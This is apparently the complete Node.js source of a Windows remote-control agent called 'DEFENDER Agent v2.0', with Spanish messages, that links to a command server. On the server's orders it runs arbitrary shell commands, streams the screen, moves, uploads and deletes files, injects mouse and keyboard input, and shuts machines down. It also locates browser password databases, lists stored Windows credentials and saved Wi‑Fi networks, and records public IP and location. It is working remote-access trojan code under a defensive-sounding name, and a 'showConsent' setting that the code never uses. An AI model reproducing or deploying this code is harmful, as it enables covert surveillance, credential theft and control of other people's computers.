// =============================================
// DEFENDER Agent v2.0 — Windows Standalone
// NO native dependencies — uses PowerShell
// Compiles to .exe with pkg
// =============================================

const { io } = require('socket.io-client');
const os = require('os');
const fs = require('fs');
const path = require('path');
const { exec, execSync } = require('child_process');
const crypto = require('crypto');
const https = require('https');
const http = require('http');

// =============================================
// CONFIG
// =============================================
const BASE_DIR = process.pkg ? path.dirname(process.execPath) : __dirname;
const CONFIG_PATH = path.join(BASE_DIR, 'config.json');
let config = { serverUrl: 'http://localhost:3000', heartbeatInterval: 15000, showConsent: true };
try { config = { ...config, ...JSON.parse(fs.readFileSync(CONFIG_PATH, 'utf8')) }; } catch {}

const SERVER_URL = config.serverUrl;
const DEVICE_ID = getOrCreateDeviceId();
const SESSION_ID = crypto.randomUUID().substring(0, 8);

let socket = null;
let screenStreamTimer = null;
let currentDir = os.homedir();

// =============================================
// DEVICE ID — persists next to .exe
// =============================================
function getOrCreateDeviceId() {
  const idFile = path.join(BASE_DIR, '.device-id');
  try {
    const id = fs.readFileSync(idFile, 'utf8').trim();
    if (id.length > 4) return id;
  } catch {}
  const id = crypto.randomUUID().substring(0, 12);
  try { fs.writeFileSync(idFile, id); } catch {}
  return id;
}

// =============================================
// HTTP GET helper (no dependencies)
// =============================================
function httpGet(url, timeout = 5000) {
  return new Promise((resolve, reject) => {
    const mod = url.startsWith('https') ? https : http;
    const req = mod.get(url, { timeout }, (res) => {
      let data = '';
      res.on('data', c => data += c);
      res.on('end', () => resolve(data.trim()));
    });
    req.on('error', reject);
    req.on('timeout', () => { req.destroy(); reject(new Error('timeout')); });
  });
}

// =============================================
// SYSTEM INFO (no dependencies needed)
// =============================================
function getLocalIP() {
  const nets = os.networkInterfaces();
  for (const name of Object.keys(nets)) {
    for (const net of nets[name]) {
      if (net.family === 'IPv4' && !net.internal) return net.address;
    }
  }
  return '127.0.0.1';
}

async function getSystemInfo() {
  const cpus = os.cpus();
  const info = {
    deviceId: DEVICE_ID,
    sessionId: SESSION_ID,
    pcName: os.hostname(),
    username: os.userInfo().user,
    os: `Windows ${os.release()}`,
    osVersion: os.version ? os.version() : os.release(),
    cpu: cpus[0]?.model || 'Unknown',
    ram: `${Math.round(os.totalmem() / (1024 ** 3))} GB`,
    localIp: getLocalIP(),
    publicIp: '',
    location: ''
  };

  try {
    const ipData = await httpGet('https://ipapi.co/json/');
    const json = JSON.parse(ipData);
    info.publicIp = json.ip || '';
    info.location = [json.city, json.region, json.country_name].filter(Boolean).join(', ');
  } catch {
    try { info.publicIp = await httpGet('https://api.ipify.org'); } catch {}
  }

  return info;
}

// =============================================
// SHELL EXECUTION
// =============================================
function runShell(command, timeout = 30000) {
  return new Promise(resolve => {
    exec(command, { cwd: currentDir, timeout, maxBuffer: 10 * 1024 * 1024, windowsHide: true }, (err, stdout, stderr) => {
      if (err && !stdout && !stderr) return resolve(`❌ Error: ${err.message}`);
      resolve((stdout || '') + (stderr || '') || '✅ Comando ejecutado (sin salida)');
    });
  });
}

// =============================================
// SCREENSHOT via PowerShell (no native deps!)
// =============================================
function takeScreenshot(quality = 70) {
  return new Promise(resolve => {
    const tmpFile = path.join(os.tmpdir(), `ds_${Date.now()}.jpg`);
    const ps = `
      Add-Type -AssemblyName System.Windows.Forms
      Add-Type -AssemblyName System.Drawing
      $bounds = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds
      $bmp = New-Object System.Drawing.Bitmap($bounds.Width, $bounds.Height)
      $g = [System.Drawing.Graphics]::FromImage($bmp)
      $g.CopyFromScreen($bounds.Location, [System.Drawing.Point]::Empty, $bounds.Size)
      $g.Dispose()
      $codec = [System.Drawing.Imaging.ImageCodecInfo]::GetImageEncoders() | Where-Object { $_.MimeType -eq 'image/jpeg' }
      $params = New-Object System.Drawing.Imaging.EncoderParameters(1)
      $params.Param[0] = New-Object System.Drawing.Imaging.EncoderParameter([System.Drawing.Imaging.Encoder]::Quality, ${quality}L)
      $bmp.Save('${tmpFile.replace(/\\/g, '\\\\')}', $codec, $params)
      $bmp.Dispose()
    `.replace(/\n/g, '; ');

    exec(`powershell -NoProfile -NonInteractive -Command "${ps}"`, { windowsHide: true, timeout: 10000 }, (err) => {
      if (err || !fs.existsSync(tmpFile)) return resolve(null);
      try {
        const data = fs.readFileSync(tmpFile);
        fs.unlinkSync(tmpFile);
        resolve(data.toString('base64'));
      } catch { resolve(null); }
    });
  });
}

// =============================================
// SCREEN STREAM
// =============================================
function startScreenStream(fps = 2, quality = 40) {
  stopScreenStream();
  const interval = Math.max(300, Math.floor(1000 / fps));
  console.log(`[AGENT] 🖥️ Stream: ${fps} FPS, quality ${quality}%`);

  let busy = false;
  screenStreamTimer = setInterval(async () => {
    if (busy || !socket?.connected) return;
    busy = true;
    try {
      const frame = await takeScreenshot(quality);
      if (frame && socket.connected) {
        socket.emit('screen-frame', { frame });
      }
    } catch {}
    busy = false;
  }, interval);
}

function stopScreenStream() {
  if (screenStreamTimer) {
    clearInterval(screenStreamTimer);
    screenStreamTimer = null;
    console.log('[AGENT] 🖥️ Stream detenido');
  }
}

// =============================================
// FILE OPERATIONS
// =============================================
function listDirectory(dirPath) {
  try {
    const resolved = path.resolve(currentDir, dirPath || '.');
    if (!fs.existsSync(resolved)) {
      socket.emit('ls-result', { 
        error: `Directorio no encontrado: ${resolved}`, 
        currentPath: currentDir,
        items: []
      });
      return;
    }
    
    const stat = fs.statSync(resolved);
    if (!stat.isDirectory()) {
      socket.emit('ls-result', { 
        error: `No es un directorio: ${resolved}`, 
        currentPath: currentDir,
        items: []
      });
      return;
    }
    
    currentDir = resolved;

    const entries = fs.readdirSync(resolved, { withFileTypes: true });
    const items = entries.map(e => {
      let size = 0;
      let modified = '';
      try {
        const fullPath = path.join(resolved, e.name);
        const stat = fs.statSync(fullPath);
        if (e.isFile()) size = stat.size;
        modified = stat.mtime.toLocaleString('es-ES', { 
          year: 'numeric', 
          month: '2-digit', 
          day: '2-digit', 
          hour: '2-digit', 
          minute: '2-digit' 
        });
      } catch {}
      return { 
        name: e.name, 
        isDir: e.isDirectory(), 
        type: e.isDirectory() ? 'dir' : 'file',
        size, 
        modified,
        fullPath: path.join(resolved, e.name) 
      };
    });

    // Add Windows drives if we're at root or C:\
    let drives = [];
    if (resolved === 'C:\\' || resolved === '/' || resolved.match(/^[A-Z]:\\$/)) {
      try {
        const driveStr = execSync('wmic logicaldisk get name', { windowsHide: true }).toString();
        drives = driveStr.split('\n')
          .map(l => l.trim())
          .filter(l => /^[A-Z]:$/.test(l))
          .map(d => ({ 
            name: d, 
            isDir: true, 
            type: 'dir',
            size: 0, 
            modified: '',
            fullPath: d + '\\' 
          }));
      } catch {}
    }

    socket.emit('ls-result', { 
      currentPath: resolved, 
      path: resolved,
      items: [...items] 
    });
  } catch (err) {
    socket.emit('ls-result', { 
      error: `Error: ${err.message}`, 
      currentPath: currentDir,
      items: []
    });
  }
}

// =============================================
// CREDENTIALS & BROWSER DETECTION
// =============================================
async function extractCredentials() {
  const home = process.env.USERPROFILE || os.homedir();
  const r = [];

  const checks = [
    ['Chrome', path.join(home, 'AppData', 'Local', 'Google', 'Chrome', 'User Data', 'Default', 'Login Data')],
    ['Edge', path.join(home, 'AppData', 'Local', 'Microsoft', 'Edge', 'User Data', 'Default', 'Login Data')],
  ];
  for (const [name, p] of checks) {
    if (fs.existsSync(p)) r.push(`✅ ${name} - DB encontrada\n   📁 ${p}`);
  }

  // Firefox
  const ffDir = path.join(home, 'AppData', 'Roaming', 'Mozilla', 'Firefox', 'Profiles');
  if (fs.existsSync(ffDir)) {
    for (const p of fs.readdirSync(ffDir)) {
      const lf = path.join(ffDir, p, 'logins.json');
      if (fs.existsSync(lf)) r.push(`✅ Firefox - Perfil\n   📁 ${lf}`);
    }
  }

  try {
    const creds = await runShell('cmdkey /list');
    if (creds.includes('Target:')) r.push(`\n🔑 Credenciales Windows:\n${creds}`);
  } catch {}

  try {
    const wifi = await runShell('netsh wlan show profiles');
    const nets = wifi.split('\n').filter(l => l.includes('All User Profile')).map(l => l.split(':')[1]?.trim()).filter(Boolean);
    if (nets.length) r.push(`\n📶 WiFi guardadas:\n${nets.slice(0, 20).map(n => `   • ${n}`).join('\n')}\n\n💡 Usa: shell netsh wlan show profile name="NOMBRE" key=clear`);
  } catch {}

  return r.length ? '🔐 CREDENCIALES ENCONTRADAS\n\n' + r.join('\n\n') : '❌ No se encontraron credenciales';
}

function detectBrowsers() {
  const home = process.env.USERPROFILE || os.homedir();
  const found = [];
  const checks = [
    ['Chrome', path.join(home, 'AppData', 'Local', 'Google', 'Chrome')],
    ['Edge', path.join(home, 'AppData', 'Local', 'Microsoft', 'Edge')],
    ['Firefox', path.join(home, 'AppData', 'Roaming', 'Mozilla', 'Firefox')],
    ['Brave', path.join(home, 'AppData', 'Local', 'BraveSoftware')],
    ['Opera', path.join(home, 'AppData', 'Roaming', 'Opera Software')],
  ];
  for (const [name, p] of checks) {
    if (fs.existsSync(p)) found.push(`✅ ${name} detectado`);
  }
  return found.length ? '🌐 Navegadores:\n' + found.join('\n') : '❌ No se encontraron navegadores';
}

// =============================================
// SHOW MESSAGE (PowerShell)
// =============================================
function showMessage(text) {
  const safe = text.replace(/'/g, "''").replace(/`/g, "``");
  exec(`powershell -NoProfile -Command "Add-Type -AssemblyName PresentationFramework; [System.Windows.MessageBox]::Show('${safe}', 'Mensaje del Sistema', 'OK', 'Information')"`, { windowsHide: true });
}

// =============================================
// CONNECT TO SERVER
// =============================================
async function connect() {
  console.log(`[AGENT] 🔌 Conectando a ${SERVER_URL}...`);

  socket = io(SERVER_URL, {
    auth: { type: 'agent' },
    reconnection: true,
    reconnectionDelay: 5000,
    reconnectionAttempts: Infinity,
    timeout: 10000,
    transports: ['websocket', 'polling']
  });

  socket.on('connect', async () => {
    console.log('[AGENT] ✅ Conectado al servidor');
    const info = await getSystemInfo();
    socket.emit('register', info);

    // Heartbeat
    setInterval(() => { if (socket.connected) socket.emit('heartbeat'); }, config.heartbeatInterval);
  });

  socket.on('disconnect', () => {
    console.log('[AGENT] ❌ Desconectado, reintentando...');
    stopScreenStream();
  });

  socket.on('connect_error', (e) => console.log(`[AGENT] ⚠️ Error: ${e.message}`));

  // ==========================================
  // COMMANDS
  // ==========================================
  socket.on('execute-command', async (data) => {
    const { command, args } = data;
    console.log(`[CMD] ${command} ${args || ''}`);

    try {
      let result = '';

      switch (command) {
        case 'ping': {
          let ip = 'N/A';
          try { ip = await httpGet('https://api.ipify.org'); } catch {}
          result = `🏓 Pong!\nIP: ${ip}\nPC: ${os.hostname()}\nUsuario: ${os.userInfo().user}`;
          break;
        }
        case 'sysinfo': {
          result = [
            `PC: ${os.hostname()}`, `Usuario: ${os.userInfo().user}`,
            `OS: Windows ${os.release()}`, `CPU: ${os.cpus()[0]?.model}`,
            `Cores: ${os.cpus().length}`,
            `RAM: ${Math.round(os.totalmem() / (1024 ** 3))} GB total, ${Math.round(os.freemem() / (1024 ** 3))} GB libre`,
            `Directorio: ${currentDir}`, `Uptime: ${Math.round(os.uptime() / 3600)}h`,
            `Arch: ${os.arch()}`, `IP Local: ${getLocalIP()}`
          ].join('\n');
          break;
        }
        case 'shell': result = await runShell(args); break;
        case 'processes': {
          result = await runShell('tasklist /FO TABLE');
          socket.emit('processes-result', { result });
          return;
        }
        case 'ls': listDirectory(args || currentDir); return;
        case 'pwd': result = `📂 ${currentDir}`; break;
        case 'cd': {
          const newDir = path.resolve(currentDir, args);
          if (fs.existsSync(newDir) && fs.statSync(newDir).isDirectory()) {
            currentDir = newDir;
            result = `✅ ${currentDir}`;
          } else result = `❌ No encontrado: ${args}`;
          break;
        }
        case 'cat': {
          const fp = path.resolve(currentDir, args);
          if (fs.existsSync(fp)) {
            const c = fs.readFileSync(fp, 'utf8');
            result = c.length > 4000 ? c.substring(0, 4000) + '\n...(truncado)' : c;
          } else result = '❌ Archivo no encontrado';
          break;
        }
        case 'msg': showMessage(args || 'Mensaje'); result = '✅ Mensaje mostrado'; break;
        case 'move_mouse': {
          const [x, y] = (args || '').split(' ').map(Number);
          if (!isNaN(x) && !isNaN(y)) {
            await runShell(`powershell -NoProfile -Command "Add-Type -AssemblyName System.Windows.Forms; [System.Windows.Forms.Cursor]::Position = New-Object System.Drawing.Point(${x},${y})"`);
            result = `✅ Ratón a (${x}, ${y})`;
          } else result = '❌ Uso: move_mouse X Y';
          break;
        }
        case 'click':
          await runShell(`powershell -NoProfile -Command "$s='[DllImport(\\\"user32.dll\\\")] public static extern void mouse_event(int f,int x,int y,int d,int i);'; $m=Add-Type -MemberDefinition $s -Name M -Namespace M -PassThru; $m::mouse_event(2,0,0,0,0); Start-Sleep -M 50; $m::mouse_event(4,0,0,0,0);"`);
          result = '🖱️ Click'; break;
        case 'rightclick':
          await runShell(`powershell -NoProfile -Command "$s='[DllImport(\\\"user32.dll\\\")] public static extern void mouse_event(int f,int x,int y,int d,int i);'; $m=Add-Type -MemberDefinition $s -Name M -Namespace M -PassThru; $m::mouse_event(8,0,0,0,0); Start-Sleep -M 50; $m::mouse_event(16,0,0,0,0);"`);
          result = '🖱️ Click derecho'; break;
        case 'type':
          await runShell(`powershell -NoProfile -Command "Add-Type -AssemblyName System.Windows.Forms; [System.Windows.Forms.SendKeys]::SendWait('${(args||'').replace(/'/g,"''")}')"`,);
          result = '⌨️ Texto escrito'; break;
        case 'keypress':
          await runShell(`powershell -NoProfile -Command "Add-Type -AssemblyName System.Windows.Forms; [System.Windows.Forms.SendKeys]::SendWait('{${args}}')"`);
          result = `⌨️ Tecla '${args}'`; break;
        case 'shutdown':
          socket.emit('command-result', { command, result: '⚠️ Apagando en 10s...' });
          exec('shutdown /s /t 10', { windowsHide: true }); return;
        case 'restart':
          socket.emit('command-result', { command, result: '⚠️ Reiniciando en 10s...' });
          exec('shutdown /r /t 10', { windowsHide: true }); return;
        case 'logout':
          socket.emit('command-result', { command, result: '⚠️ Cerrando sesión...' });
          exec('shutdown /l', { windowsHide: true }); return;
        case 'password': result = await extractCredentials(); break;
        case 'history': result = detectBrowsers(); break;
        case 'wallpaper': {
          if (args && args.length > 100) {
            try {
              const tmp = path.join(os.tmpdir(), `wallpaper_${Date.now()}.jpg`);
              fs.writeFileSync(tmp, Buffer.from(args, 'base64'));
              
              // Method 1: Using PowerShell with proper escaping
              const psCommand = `
                Add-Type -TypeDefinition @'
                using System;
                using System.Runtime.InteropServices;
                public class Wallpaper {
                  [DllImport("user32.dll", CharSet = CharSet.Auto)]
                  public static extern int SystemParametersInfo(int uAction, int uParam, string lpvParam, int fuWinIni);
                }
'@
                [Wallpaper]::SystemParametersInfo(20, 0, "${tmp.replace(/\\/g, '\\\\')}", 3)
              `.trim();
              
              await runShell(`powershell -NoProfile -ExecutionPolicy Bypass -Command "${psCommand.replace(/"/g, '`"')}"`);
              
              // Method 2: Also set via registry as backup
              await runShell(`reg add "HKCU\\Control Panel\\Desktop" /v Wallpaper /t REG_SZ /d "${tmp}" /f`);
              await runShell(`RUNDLL32.EXE user32.dll,UpdatePerUserSystemParameters`);
              
              result = '🖼️ Wallpaper actualizado';
            } catch (e) {
              result = `❌ Error: ${e.message}`;
            }
          } else result = '❌ Adjunta imagen desde el panel';
          break;
        }
        default: result = `❌ Comando desconocido: ${command}`;
      }
      socket.emit('command-result', { command, result });
    } catch (err) {
      socket.emit('command-result', { command, result: `❌ ${err.message}`, error: true });
    }
  });

  // Screenshot
  socket.on('take-screenshot', async () => {
    const img = await takeScreenshot(70);
    if (img) socket.emit('screenshot-result', { image: img });
    else socket.emit('command-result', { command: 'screenshot', result: '❌ Error al capturar', error: true });
  });

  // Screen stream
  socket.on('start-screen-stream', (opts) => startScreenStream(opts.fps || 2, opts.quality || 40));
  socket.on('stop-screen-stream', () => stopScreenStream());

  // Files
  socket.on('list-directory', (d) => listDirectory(d.path));
  socket.on('download-file', (d) => {
    try {
      const fp = path.resolve(currentDir, d.filepath);
      if (!fs.existsSync(fp)) { socket.emit('command-result', { command: 'download', result: '❌ No encontrado', error: true }); return; }
      const stat = fs.statSync(fp);
      if (stat.size > 25 * 1024 * 1024) { socket.emit('command-result', { command: 'download', result: '❌ >25MB', error: true }); return; }
      socket.emit('file-data', { filename: path.basename(fp), data: fs.readFileSync(fp).toString('base64'), mimetype: 'application/octet-stream' });
    } catch (e) { socket.emit('command-result', { command: 'download', result: `❌ ${e.message}`, error: true }); }
  });
  socket.on('upload-file', (d) => {
    try {
      const dest = path.join(d.destPath ? path.resolve(currentDir, d.destPath) : currentDir, d.filename);
      fs.writeFileSync(dest, Buffer.from(d.data, 'base64'));
      socket.emit('command-result', { command: 'upload', result: `✅ Guardado: ${dest}` });
      // Refresh directory listing
      listDirectory(currentDir);
    } catch (e) { socket.emit('command-result', { command: 'upload', result: `❌ ${e.message}`, error: true }); }
  });
  socket.on('delete-file', (d) => {
    try {
      const fp = path.resolve(currentDir, d.filepath);
      if (!fs.existsSync(fp)) {
        socket.emit('command-result', { command: 'delete', result: '❌ Archivo no encontrado', error: true });
        return;
      }
      fs.unlinkSync(fp);
      socket.emit('command-result', { command: 'delete', result: `✅ Eliminado: ${path.basename(fp)}` });
      // Refresh directory listing
      listDirectory(currentDir);
    } catch (e) { socket.emit('command-result', { command: 'delete', result: `❌ ${e.message}`, error: true }); }
  });
  socket.on('get-processes', async () => {
    socket.emit('processes-result', { result: await runShell('tasklist /FO TABLE') });
  });
}

// =============================================
// MAIN
// =============================================
async function main() {
  console.log('');
  console.log('╔══════════════════════════════════════════════╗');
  console.log('║   🛡️  DEFENDER Agent v2.0                    ║');
  console.log(`║   📡 Server: ${SERVER_URL.padEnd(31)}║`);
  console.log(`║   🆔 ID: ${DEVICE_ID.padEnd(34)}║`);
  console.log('╚══════════════════════════════════════════════╝');
  console.log('');
  await connect();
}

main().catch(e => { console.error('Fatal:', e); process.exit(1); });
